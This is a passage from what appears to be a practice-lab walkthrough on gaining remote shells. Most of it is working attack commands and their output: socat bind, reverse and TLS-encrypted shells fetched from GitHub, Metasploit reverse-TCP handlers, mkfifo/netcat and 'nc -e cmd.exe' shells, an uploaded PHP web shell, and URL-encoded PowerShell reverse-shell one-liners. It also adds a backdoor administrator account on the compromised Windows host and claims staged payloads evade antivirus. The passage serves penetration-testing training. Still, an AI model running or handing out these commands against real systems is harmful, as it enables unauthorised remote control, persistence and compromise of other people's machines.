</code></pre><p>Activate the <code>bind shell</code> from the attacker.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="wget%20-q%20https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat%20-O%20/tmp/socat;%20chmod%20+x%20/tmp/socat;%20/tmp/socat%20TCP:%3Ctarget-ip%3E:4430%20FILE:%60tty%60,raw,echo=0" type="button"></button></div></div><pre><code>wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat TCP:&lt;target-ip&gt;:4430 FILE:`tty`,raw,echo=0
</code></pre><p>An output similar to below will be obtained in <code>socat</code> listener.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="shell@linux-shell-practice:~$%20%5EC%0Ashell@linux-shell-practice:~$%20exit%0Alogout" type="button"></button></div></div><pre><code>shell@linux-shell-practice:~$ ^C
shell@linux-shell-practice:~$ exit
logout
</code></pre><h3 id="encrypted-socat-shell---linux">Encrypted Socat Shell - Linux</h3><p><code>Socat</code> can be installed from distribution repo or a standalone binary can be downloaded and used. The links for standalone binaries for linux is <a href="https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat?raw=true" target="_blank">here</a> and windows is <a href="https://sourceforge.net/projects/unix-utils/files/socat/" target="_blank">here</a>.</p><p><code>Socat</code> shell is stabilised and sanitised by default and does not need additional configurations after gaining <code>shell</code>. The following is an example for <code>reverse shell</code>. For <code>bind shell</code>, the generated certificate should be copied to target machine before creating a listener.</p><p>Using <code>openssl</code>, create a self-signed <code>cert</code> and <code>key</code>.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="openssl%20req%20--newkey%20rsa:2048%20-nodes%20-keyout%20shell.key%20-x509%20-days%20362%20-out%20shell.crt" type="button"></button></div></div><pre><code>openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt
</code></pre><p>An output similar to below will be obtained. Default values can be accepted or set manually.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="Generating%20a%20RSA%20private%20key%0Awriting%20new%20private%20key%20to%20'shell.key'%0AYou%20are%20about%20to%20be%20asked%20to%20enter%20information%20that%20will%20be%20incorporated%0Ainto%20your%20certificate%20request.%0AWhat%20you%20are%20about%20to%20enter%20is%20what%20is%20called%20a%20Distinguished%20Name%20or%20a%20DN.%0AThere%20are%20quite%20a%20few%20fields%20but%20you%20can%20leave%20some%20blank%0AFor%20some%20fields%20there%20will%20be%20a%20default%20value,%0AIf%20you%20enter%20'.',%20the%20field%20will%20be%20left%20blank.%0ACountry%20Name%20(2%20letter%20code)%20[AU]:%0AState%20or%20Province%20Name%20(full%20name)%20[Some-State]:%0ALocality%20Name%20(eg,%20city)%20[]:%0AOrganization%20Name%20(eg,%20company)%20[Internet%20Widgits%20Pty%20Ltd]:%0AOrganizational%20Unit%20Name%20(eg,%20section)%20[]:%0ACommon%20Name%20(e.g.%20server%20FQDN%20or%20YOUR%20name)%20[]:%0AEmail%20Address%20[]:" type="button"></button></div></div><pre><code>Generating a RSA private key
writing new private key to 'shell.key'
You are about to be asked to enter information that will be incorporated
into your certificate request.
What you are about to enter is what is called a Distinguished Name or a DN.
There are quite a few fields but you can leave some blank
For some fields there will be a default value,
If you enter '.', the field will be left blank.
Country Name (2 letter code) [AU]:
State or Province Name (full name) [Some-State]:
Locality Name (eg, city) []:
Organization Name (eg, company) [Internet Widgits Pty Ltd]:
Organizational Unit Name (eg, section) []:
Common Name (e.g. server FQDN or YOUR name) []:
Email Address []:
</code></pre><p>Create <code>pem</code> file from the generated <code>cert</code> and <code>key</code> files.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="cat%20shell.key%20shell.crt%20%3E%20shell.pem" type="button"></button></div></div><pre><code>cat shell.key shell.crt &gt; shell.pem
</code></pre><p>Create an <code>encrypted socat</code> listener in attacking machine.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="wget%20-q%20https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat%20-O%20/tmp/socat;%20chmod%20+x%20/tmp/socat;%20/tmp/socat%20OPENSSL-LISTEN:443,cert=shell.pem,verify=0%20FILE:%60tty%60,raw,echo=0" type="button"></button></div></div><pre><code>wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat OPENSSL-LISTEN:443,cert=shell.pem,verify=0 FILE:`tty`,raw,echo=0
</code></pre><p>Activate the <code>encrypted reverse shell</code> from the target.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="wget%20-q%20https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat%20-O%20/tmp/socat;%20chmod%20+x%20/tmp/socat;%20/tmp/socat%20OPENSSL:%3Clocal-ip%3E:443,verify=0%20EXEC:%22bash%20-li%22,pty,stderr,sigint,setsid,sane" type="button"></button></div></div><pre><code>wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat OPENSSL:&lt;local-ip&gt;:443,verify=0 EXEC:"bash -li",pty,stderr,sigint,setsid,sane
</code></pre><p>An output similar to below will be obtained in <code>encrypted socat</code> listener.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="shell@linux-shell-practice:~$%20%5EC%0Ashell@linux-shell-practice:~$%20exit%0Alogout" type="button"></button></div></div><pre><code>shell@linux-shell-practice:~$ ^C
shell@linux-shell-practice:~$ exit
logout
</code></pre><h3 id="stageless-meterpreter-shell---linux">Stageless Meterpreter Shell - Linux</h3><p>Use <code>msfconsole</code> to create <code>multi/handler</code> and load the payload <code>linux/x64/shell_reverse_tcp</code>, which is <code>stageless</code>. The <code>exploit</code> is given in background, and hence sessions will not be loaded by default.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="msf5%20%3E%20use%20multi/handler%0A[*]%20Using%20configured%20payload%20generic/shell_reverse_tcp%0Amsf5%20exploit(multi/handler)%20%3E%20set%20LHOST%20%3Clocal-ip%3E%0ALHOST%20=%3E%20%3Clocal-ip%3E%0Amsf5%20exploit(multi/handler)%20%3E%20set%20LPORT%20443%0ALPORT%20=%3E%20443%0Amsf5%20exploit(multi/handler)%20%3E%20set%20PAYLOAD%20linux/x64/shell_reverse_tcp%0APAYLOAD%20=%3E%20linux/x64/shell_reverse_tcp%0Amsf5%20exploit(multi/handler)%20%3E%20exploit%20-j%0A[*]%20Exploit%20running%20as%20background%20job%200.%0A[*]%20Exploit%20completed,%20but%20no%20session%20was%20created.%0A%0A[*]%20Started%20reverse%20TCP%20handler%20on%20%3Clocal-ip%3E:443%20" type="button"></button></div></div><pre><code>msf5 &gt; use multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf5 exploit(multi/handler) &gt; set LHOST &lt;local-ip&gt;
LHOST =&gt; &lt;local-ip&gt;
msf5 exploit(multi/handler) &gt; set LPORT 443
LPORT =&gt; 443
msf5 exploit(multi/handler) &gt; set PAYLOAD linux/x64/shell_reverse_tcp
PAYLOAD =&gt; linux/x64/shell_reverse_tcp
msf5 exploit(multi/handler) &gt; exploit -j
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on &lt;local-ip&gt;:443 
</code></pre><p>Activate the <code>reverse shell</code> from the attacker.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="mkfifo%20/tmp/f%20;%20nc%20-nv%20%3Clocal-ip%3E%20443%20%3C%20/tmp/f%20%7C%20/bin/sh%20%3E%20/tmp/f%202%3E&amp;1%20;%20rm%20-rf%20/tmp/f" type="button"></button></div></div><pre><code>mkfifo /tmp/f ; nc -nv &lt;local-ip&gt; 443 &lt; /tmp/f | /bin/sh &gt; /tmp/f 2&gt;&amp;1 ; rm -rf /tmp/f
</code></pre><p>An output similar to below will be obtained indicating the connection established to <code>msfconsole</code> terminal.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="(UNKNOWN)%20[%3Clocal-ip%3E]%20443%20(https)%20open" type="button"></button></div></div><pre><code>(UNKNOWN) [&lt;local-ip&gt;] 443 (https) open
</code></pre><p>In the <code>msfconsole</code> terminal, bring the session to foreground for interaction. Use <code>python</code> to spawn <code>bash</code> shell. The session will be stabilised and sanitised by default by <code>msfconsole</code>.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="msf5%20exploit(multi/handler)%20%3E%20[*]%20Command%20shell%20session%201%20opened%20(%3Clocal-ip%3E:443%20-%3E%20%3Ctarget-ip%3E:45512)%20at%202021-04-13%2011:13:18%20+0100%0A%0Amsf5%20exploit(multi/handler)%20%3E%20sessions%201%0A[*]%20Starting%20interaction%20with%201...%0A%0Apython3%20-c%20'import%20pty;%20pty.spawn(%22/bin/bash%22)'%0Ashell@linux-shell-practice:~$%20%5EC%0AAbort%20session%202?%20[y/N]%20%20y%0A%0A[*]%20%3Ctarget-ip%3E%20-%20Command%20shell%20session%202%20closed.%20%20Reason:%20User%20exit%0Amsf5%20exploit(multi/handler)%20%3E" type="button"></button></div></div><pre><code>msf5 exploit(multi/handler) &gt; [*] Command shell session 1 opened (&lt;local-ip&gt;:443 -&gt; &lt;target-ip&gt;:45512) at 2021-04-13 11:13:18 +0100

msf5 exploit(multi/handler) &gt; sessions 1
[*] Starting interaction with 1...

python3 -c 'import pty; pty.spawn("/bin/bash")'
shell@linux-shell-practice:~$ ^C
Abort session 2? [y/N]  y

[*] &lt;target-ip&gt; - Command shell session 2 closed.  Reason: User exit
msf5 exploit(multi/handler) &gt;
</code></pre><h3 id="staged-meterpreter-shell---linux">Staged Meterpreter Shell - Linux</h3><p>Use <code>msfconsole</code> to create <code>multi/handler</code> and load the payload <code>linux/x64/shell/reverse_tcp</code>, which is <code>staged</code>, and hence can evade firewalls and antivirus. The <code>exploit</code> is given in background, and hence sessions will not be loaded by default.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="msf5%20%3E%20use%20multi/handler%0A[*]%20Using%20configured%20payload%20generic/shell_reverse_tcp%0Amsf5%20exploit(multi/handler)%20%3E%20set%20LHOST%20%3Clocal-ip%3E%0ALHOST%20=%3E%20%3Clocal-ip%3E%0Amsf5%20exploit(multi/handler)%20%3E%20set%20LPORT%20443%0ALPORT%20=%3E%20443%0Amsf5%20exploit(multi/handler)%20%3E%20set%20PAYLOAD%20linux/x64/shell/reverse_tcp%0APAYLOAD%20=%3E%20linux/x64/shell/reverse_tcp%0Amsf5%20exploit(multi/handler)%20%3E%20exploit%20-j%0A[*]%20Exploit%20running%20as%20background%20job%200.%0A[*]%20Exploit%20completed,%20but%20no%20session%20was%20created.%0A%0A[*]%20Started%20reverse%20TCP%20handler%20on%20%3Clocal-ip%3E:443%20" type="button"></button></div></div><pre><code>msf5 &gt; use multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf5 exploit(multi/handler) &gt; set LHOST &lt;local-ip&gt;
LHOST =&gt; &lt;local-ip&gt;
msf5 exploit(multi/handler) &gt; set LPORT 443
LPORT =&gt; 443
msf5 exploit(multi/handler) &gt; set PAYLOAD linux/x64/shell/reverse_tcp
PAYLOAD =&gt; linux/x64/shell/reverse_tcp
msf5 exploit(multi/handler) &gt; exploit -j
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on &lt;local-ip&gt;:443 
</code></pre><p>Activate the <code>reverse shell</code> from the attacker.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="mkfifo%20/tmp/f%20;%20nc%20-nv%20%3Clocal-ip%3E%20443%20%3C%20/tmp/f%20%7C%20/bin/sh%20%3E%20/tmp/f%202%3E&amp;1%20;%20rm%20-rf%20/tmp/f" type="button"></button></div></div><pre><code>mkfifo /tmp/f ; nc -nv &lt;local-ip&gt; 443 &lt; /tmp/f | /bin/sh &gt; /tmp/f 2&gt;&amp;1 ; rm -rf /tmp/f
</code></pre><p>An output similar to below will be obtained indicating the connection established to <code>msfconsole</code> terminal.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="(UNKNOWN)%20[%3Clocal-ip%3E]%20443%20(https)%20open" type="button"></button></div></div><pre><code>(UNKNOWN) [&lt;local-ip&gt;] 443 (https) open
</code></pre><p>In the <code>msfconsole</code> terminal, bring the session to foreground for interaction. Use <code>python</code> to spawn <code>bash</code> shell. The session will be stabilised and sanitised by default by <code>msfconsole</code>.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="msf5%20exploit(multi/handler)%20%3E%20[*]%20Sending%20stage%20(38%20bytes)%20to%20%3Ctarget-ip%3E%0A[*]%20Command%20shell%20session%201%20opened%20(%3Clocal-ip%3E:443%20-%3E%20%3Ctarget-ip%3E:45518)%20at%202021-04-13%2011:20:09%20+0100%0A%0Amsf5%20exploit(multi/handler)%20%3E%20sessions%201%0A[*]%20Starting%20interaction%20with%201...%0A%0Apython3%20-c%20'import%20pty%20;%20pty.spawn(%22/bin/bash%22)'%0Ashell@linux-shell-practice:~$%20%5EC%0AAbort%20session%201?%20[y/N]%20%20y%0A%0A[*]%20%3Ctarget-ip%3E%20-%20Command%20shell%20session%201%20closed.%20%20Reason:%20User%20exit%0Amsf5%20exploit(multi/handler)%20%3E" type="button"></button></div></div><pre><code>msf5 exploit(multi/handler) &gt; [*] Sending stage (38 bytes) to &lt;target-ip&gt;
[*] Command shell session 1 opened (&lt;local-ip&gt;:443 -&gt; &lt;target-ip&gt;:45518) at 2021-04-13 11:20:09 +0100

msf5 exploit(multi/handler) &gt; sessions 1
[*] Starting interaction with 1...

python3 -c 'import pty ; pty.spawn("/bin/bash")'
shell@linux-shell-practice:~$ ^C
Abort session 1? [y/N]  y

[*] &lt;target-ip&gt; - Command shell session 1 closed.  Reason: User exit
msf5 exploit(multi/handler) &gt;
</code></pre><h3 id="enumeration---windows">Enumeration - Windows</h3><p>Check the services running in the target.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="nmap%20-Pn%20-T4%20-sS%20-F%20%3Cip%3E" type="button"></button></div></div><pre><code>nmap -Pn -T4 -sS -F &lt;ip&gt;
</code></pre><p>An output similar to below will be obtained.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="Starting%20Nmap%207.60%20(%20https://nmap.org%20)%20at%202021-04-13%2013:34%20BST%0ANmap%20scan%20report%20for%20%3Chostname%3E%20(%3Ctarget-ip%3E)%0AHost%20is%20up%20(0.0011s%20latency).%0ANot%20shown:%2094%20closed%20ports%0APORT%20%20%20%20%20STATE%20SERVICE%0A80/tcp%20%20%20open%20%20http%0A135/tcp%20%20open%20%20msrpc%0A139/tcp%20%20open%20%20netbios-ssn%0A443/tcp%20%20open%20%20https%0A445/tcp%20%20open%20%20microsoft-ds%0A3389/tcp%20open%20%20ms-wbt-server%0AMAC%20Address:%2002:B4:EB:52:EE:FD%20(Unknown)%0A%0ANmap%20done:%201%20IP%20address%20(1%20host%20up)%20scanned%20in%203.14%20seconds" type="button"></button></div></div><pre><code>Starting Nmap 7.60 ( https://nmap.org ) at 2021-04-13 13:34 BST
Nmap scan report for &lt;hostname&gt; (&lt;target-ip&gt;)
Host is up (0.0011s latency).
Not shown: 94 closed ports
PORT     STATE SERVICE
80/tcp   open  http
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
443/tcp  open  https
445/tcp  open  microsoft-ds
3389/tcp open  ms-wbt-server
MAC Address: 02:B4:EB:52:EE:FD (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 3.14 seconds
</code></pre><h3 id="web-shell-upload---windows">Web shell upload - Windows</h3><p>Copy the webshell available in <code>/usr/share/webshells/php/php-reverse-shell.php</code> and edit the file to modify <code>ip</code> and <code>port</code> of attacking machine.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="$ip%20=%20'%3Clocal-ip%3E';%0A$port%20=%20443;" type="button"></button></div></div><pre><code>$ip = '&lt;local-ip&gt;';
$port = 443;
</code></pre><p>Create a <code>netcat</code> listener in attacking machine.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="rlwrap%20nc%20-lnvp%20443" type="button"></button></div></div><pre><code>rlwrap nc -lnvp 443
</code></pre><p>An output similar to below will be obtained, which mentions the listener is active.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="Listening%20on%20[0.0.0.0]%20(family%200,%20port%20443)" type="button"></button></div></div><pre><code>Listening on [0.0.0.0] (family 0, port 443)
</code></pre><p>Use <code>firefox</code> to login to the url <code>http://&lt;ip&gt;</code>, browse the <code>php-reverse-shell.php</code> payload and submit. Access the url <code>http://&lt;ip&gt;/uploads/php-reverse-shell.php</code> to activate the <code>reverse shell</code>.</p><p>The <code>reverse shell</code> would have spawned at the netcat listener.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="Connection%20from%20%3Ctarget-ip%3E%2049750%20received!" type="button"></button></div></div><pre><code>Connection from &lt;target-ip&gt; 49750 received!
</code></pre><p>However, the <code>php reverse shell</code> would not have activated, as this is not compatible with windows. The following error would occur in <code>firefox</code>.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="Notice:%20Undefined%20variable:%20daemon%20in%20C:%5Cxampp%5Chtdocs%5Cuploads%5Cphp-reverse-shell.php%20on%20line%20184%0AWARNING:%20Failed%20to%20daemonise.%20This%20is%20quite%20common%20and%20not%20fatal.%0ANotice:%20Undefined%20variable:%20daemon%20in%20C:%5Cxampp%5Chtdocs%5Cuploads%5Cphp-reverse-shell.php%20on%20line%20184%0ASuccessfully%20opened%20reverse%20shell%20to%2010.10.255.254:443%0ANotice:%20Undefined%20variable:%20daemon%20in%20C:%5Cxampp%5Chtdocs%5Cuploads%5Cphp-reverse-shell.php%20on%20line%20184%0AERROR:%20Shell%20process%20terminated%20" type="button"></button></div></div><pre><code>Notice: Undefined variable: daemon in C:\xampp\htdocs\uploads\php-reverse-shell.php on line 184
WARNING: Failed to daemonise. This is quite common and not fatal.
Notice: Undefined variable: daemon in C:\xampp\htdocs\uploads\php-reverse-shell.php on line 184
Successfully opened reverse shell to 10.10.255.254:443
Notice: Undefined variable: daemon in C:\xampp\htdocs\uploads\php-reverse-shell.php on line 184
ERROR: Shell process terminated 
</code></pre><p>The following error would also appear in <code>netcat</code> listener shell.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="'uname'%20is%20not%20recognized%20as%20an%20internal%20or%20external%20command,%0Aoperable%20program%20or%20batch%20file." type="button"></button></div></div><pre><code>'uname' is not recognized as an internal or external command,
operable program or batch file.
</code></pre><h3 id="web-shell---windows">Web Shell - Windows</h3><p>Create a <code>php web shell</code> payload.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="%3C?php%20echo%20%22%3Cpre%3E%22%20.%20shell_exec($_GET[%22cmd%22])%20.%20%22%3C/pre%3E%22;%20?%3E" type="button"></button></div></div><pre><code>&lt;?php echo "&lt;pre&gt;" . shell_exec($_GET["cmd"]) . "&lt;/pre&gt;"; ?&gt;
</code></pre><p>Create a <code>netcat</code> listener in attacking machine.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="rlwrap%20nc%20-lnvp%20443" type="button"></button></div></div><pre><code>rlwrap nc -lnvp 443
</code></pre><p>An output similar to below will be obtained, which mentions the listener is active.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="Listening%20on%20[0.0.0.0]%20(family%200,%20port%20443)" type="button"></button></div></div><pre><code>Listening on [0.0.0.0] (family 0, port 443)
</code></pre><p>Use <code>firefox</code> to login to the url <code>http://&lt;ip&gt;</code>, browse the <code>shell.php</code> payload and submit. Access the url <code>http://&lt;ip&gt;/uploads/shell.php</code> along with the <code>powershell payload command</code> to activate the <code>reverse shell</code>.</p><p>Use any of the following payloads. The full url will use the <code>shell.php</code> payload along with <code>powershell payload command</code>.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="http://%3Ctarget-ip%3E/uploads/shell.php?cmd=powershell%20-nop%20-c%20%22$client%20=%20New-Object%20System.Net.Sockets.TCPClient('10.10255.254',443);$stream%20=%20$client.GetStream();[byte[]]$bytes%20=%200..65535%7C%25%7B0%7D;while($i%20=%20$stream.Read($bytes,%200,%20$bytes.Length))%20-ne%200)%7B;$data%20=%20(New-Object%20-TypeName%20System.TextASCIIEncoding).GetString($bytes,0,%20$i);$sendback%20=%20(iex%20$data%202%3E&amp;1%20%7C%20Out-String%20;$sendback2%20=%20$sendback%20+%20'PS%20'%20+%20(pwd).Path%20+%20'%3E%20';$sendbyte%20=%20([textencoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()%7D;$clientClose()%22%0A%0A%0Ahttp://%3Ctarget-ip%3E/uploads/shell.php?cmd=powershell%20-c%20%22$client%20=%20New-Object%20System.Net.Sockets.TCPClient('10.10.255.254',443);$stream%20=%20$client.GetStream();[byte[]]$bytes%20=%200..65535%7C%25%7B0%7D;while(($i%20=%20$stream.Read($bytes,%200,%20$bytes.Length))%20-ne%200)%7B;$data%20=%20(New-Object%20-TypeName%20System.Text.ASCIIEncoding).GetString($bytes,0,%20$i);$sendback%20=%20(iex%20$data%202%3E&amp;1%20%7C%20Out-String%20);$sendback2%20=%20$sendback%20+%20'PS%20'%20+%20(pwd).Path%20+%20'%3E%20';$sendbyte%20=%20([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()%7D;$client.Close()%22" type="button"></button></div></div><pre><code>http://&lt;target-ip&gt;/uploads/shell.php?cmd=powershell%20-nop%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient(%2710.10255.254%27%2C443)%3B%24stream%20%3D%20%24client.GetStream()%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile(%24i%20%3D%20%24stream.Read(%24bytes%2C%200%2C%20%24bytes.Length))%20-ne%200)%7B%3B%24data%20%3D%20(New-Object%20-TypeName%20System.TextASCIIEncoding).GetString(%24bytes%2C0%2C%20%24i)%3B%24sendback%20%3D%20(iex%20%24data%202%3E%261%20%7C%20Out-String%20%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20(pwd).Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20(%5Btextencoding%5D%3A%3AASCII).GetBytes(%24sendback2)%3B%24stream.Write(%24sendbyte%2C0%2C%24sendbyte.Length)%3B%24stream.Flush()%7D%3B%24clientClose()%22%0A

http://&lt;target-ip&gt;/uploads/shell.php?cmd=powershell%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%28%2710.10.255.254%27%2C443%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes%2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24data%20%3D%20%28New-Object%20-TypeName%20System.Text.ASCIIEncoding%29.GetString%28%24bytes%2C0%2C%20%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out-String%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29.Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20%28%5Btext.encoding%5D%3A%3AASCII%29.GetBytes%28%24sendback2%29%3B%24stream.Write%28%24sendbyte%2C0%2C%24sendbyte.Length%29%3B%24stream.Flush%28%29%7D%3B%24client.Close%28%29%22
</code></pre><p>The <code>reverse shell</code> would have spawned at the netcat listener.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="Connection%20from%20%3Ctarget-ip%3E%2049819%20received!%0A%0APS%20C:%5Cxampp%5Chtdocs%5Cuploads%3E%20whoami%0Ant%20authority%5Csystem%0A%0APS%20C:%5Cxampp%5Chtdocs%5Cuploads%3E%20net%20user%20tsran%20tsran123%20/add%0AThe%20command%20completed%20successfully.%0A%0APS%20C:%5Cxampp%5Chtdocs%5Cuploads%3E%20net%20localgroup%20administrators%20tsran%20/add%0AThe%20command%20completed%20successfully." type="button"></button></div></div><pre><code>Connection from &lt;target-ip&gt; 49819 received!

PS C:\xampp\htdocs\uploads&gt; whoami
nt authority\system

PS C:\xampp\htdocs\uploads&gt; net user tsran tsran123 /add
The command completed successfully.

PS C:\xampp\htdocs\uploads&gt; net localgroup administrators tsran /add
The command completed successfully.
</code></pre><p>Use <code>xfreerdp</code> to test rdp connection with newly created user.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="xfreerdp%20/dynamic-resolution%20+clipboard%20/cert:ignore%20/v:%3Ctarget-ip%3E%20/u:tsran%20/p:'%3Cpassword%3E'" type="button"></button></div></div><pre><code>xfreerdp /dynamic-resolution +clipboard /cert:ignore /v:&lt;target-ip&gt; /u:tsran /p:'&lt;password&gt;'
</code></pre><h3 id="reverse-netcat-shell---windows">Reverse Netcat shell - Windows</h3><p>Create a <code>netcat</code> listener in attacking machine.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="rlwrap%20nc%20-lnvp%20443" type="button"></button></div></div><pre><code>rlwrap nc -lnvp 443
</code></pre><p>An output similar to below will be obtained, which mentions the listener is active.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="Listening%20on%20[0.0.0.0]%20(family%200,%20port%20443)" type="button"></button></div></div><pre><code>Listening on [0.0.0.0] (family 0, port 443)
</code></pre><p>Use <code>xfreerdp</code> to test rdp connection with newly created user.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="xfreerdp%20/dynamic-resolution%20+clipboard%20/cert:ignore%20/v:%3Ctarget-ip%3E%20/u:Administrator%20/p:'%3Cpassword%3E'" type="button"></button></div></div><pre><code>xfreerdp /dynamic-resolution +clipboard /cert:ignore /v:&lt;target-ip&gt; /u:Administrator /p:'&lt;password&gt;'
</code></pre><p>Activate the <code>reverse shell</code> from the target.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="nc%20-nv%2010.10.255.254%20443%20-e%20%22cmd.exe%22" type="button"></button></div></div><pre><code>nc -nv 10.10.255.254 443 -e "cmd.exe"
</code></pre><p>An output similar to below will be obtained, indicating the connection established to <code>netcat</code> listener.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="(UNKNOWN)%20[10.10.255.254]%20443%20(?)%20open" type="button"></button></div></div><pre><code>(UNKNOWN) [10.10.255.254] 443 (?) open
</code></pre><p>The <code>reverse shell</code> in attacking machine would have spawned at the <code>netcat</code> listener.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="Connection%20from%20%3Ctarget-ip%3E%2050113%20received!%0AMicrosoft%20Windows%20[Version%2010.0.17763.1637]%0A(c)%202018%20Microsoft%20Corporation.%20All%20rights%20reserved.%0A%0AC:%5C%3E" type="button"></button></div></div><pre><code>Connection from &lt;target-ip&gt; 50113 received!
Microsoft Windows [Version 10.0.17763.1637]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\&gt;
</code></pre><h3 id="bind-netcat-shell---windows">Bind Netcat shell - Windows</h3><p>Use <code>xfreerdp</code> to test rdp connection with newly created user.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="xfreerdp%20/dynamic-resolution%20+clipboard%20/cert:ignore%20/v:%3Ctarget-ip%3E%20/u:Administrator%20/p:'%3Cpassword%3E'" type="button"></button></div></div><pre><code>xfreerdp /dynamic-resolution +clipboard /cert:ignore /v:&lt;target-ip&gt; /u:Administrator /p:'&lt;password&gt;'
</code></pre><p>Create a <code>netcat</code> listener in target machine.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="nc%20-lnvp%204430%20-e%20%22cmd.exe%22" type="button"></button></div></div><pre><code>nc -lnvp 4430 -e "cmd.exe"
</code></pre><p>An output similar to below will be obtained, which mentions the listener is active.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="listening%20on%20[any]%204430%20..." type="button"></button></div></div><pre><code>listening on [any] 4430 ...
